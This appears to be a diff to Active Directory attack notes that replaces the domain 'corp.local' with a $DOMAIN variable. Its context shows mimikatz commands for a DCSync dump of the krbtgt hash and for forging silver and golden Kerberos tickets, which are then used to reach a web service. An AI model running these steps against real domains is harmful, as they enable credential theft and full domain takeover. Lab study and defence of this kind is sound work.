@@ -37,7 +37,7 @@ RC4/NTLM: 4d28cf5252d39971419580a51484ca09
 ## Step 2: Forge Ticket
 
 ```powershell
-mimikatz # kerberos::golden /user:jeffadmin /domain:corp.local /sid:S-1-5-21-1234... /target:web.corp.local /service:http /rc4:4d28cf... /ptt
+mimikatz # kerberos::golden /user:jeffadmin /domain:$DOMAIN /sid:S-1-5-21-1234... /target:web.$DOMAIN /service:http /rc4:4d28cf... /ptt
 ```
 
 ## Step 3: Use the Ticket
@@ -47,7 +47,7 @@ klist
 ```
 
 ```powershell
-Invoke-WebRequest -UseDefaultCredentials http://web.corp.local
+Invoke-WebRequest -UseDefaultCredentials http://web.$DOMAIN
 ```
 
 ---
@@ -63,7 +63,7 @@ Invoke-WebRequest -UseDefaultCredentials http://web.corp.local
 ## Step 1: Dump `krbtgt` Hash via DCSync
 
 ```powershell
-mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+mimikatz # lsadump::dcsync /domain:$DOMAIN /user:krbtgt
 ```
 
 Output:
@@ -75,7 +75,7 @@ NTLM: 1693c6cefafffc7af11ef34d1c788f47
 ## Step 2: Forge Ticket
 
 ```powershell
-mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt
+mimikatz # kerberos::golden /user:administrator /domain:$DOMAIN /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt
 ```
 
 ## Step 3: Use the Ticket
